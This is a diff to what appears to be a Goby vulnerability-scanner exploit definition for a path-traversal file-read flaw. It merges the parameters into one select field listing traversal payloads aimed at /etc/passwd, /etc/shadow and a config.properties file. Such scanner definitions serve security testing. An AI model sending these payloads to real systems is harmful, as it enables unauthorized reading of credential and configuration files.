@@ -18,17 +18,10 @@
 	  "ExpParams": [
 		{
 			"name": "Filename",
-			"type": "input",
-			"value": "/../conf/config.properties",
-			"show": ""
-		},
-		{
-			"name": "/etc/passwd",
-			"type": "textarea",
-			"value": "/../../../../../../../../../../etc/passwd",
+			"type": "select",
+			"value": "/../../../../../../../../../../etc/passwd,/../conf/config.properties,/../../../../../../../../../../etc/shadow",
 			"show": ""
 		}
-		
 	  ],
       "ScanSteps": [
             "AND",
@@ -80,6 +73,6 @@
 				  ]
             }
       ],
-      "PostTime": "2021-01-21 20:51:57",
-      "GobyVersion": "1.8.230"
+      "PostTime": "2021-01-22 18:20:52",
+      "GobyVersion": "1.8.237"
 }
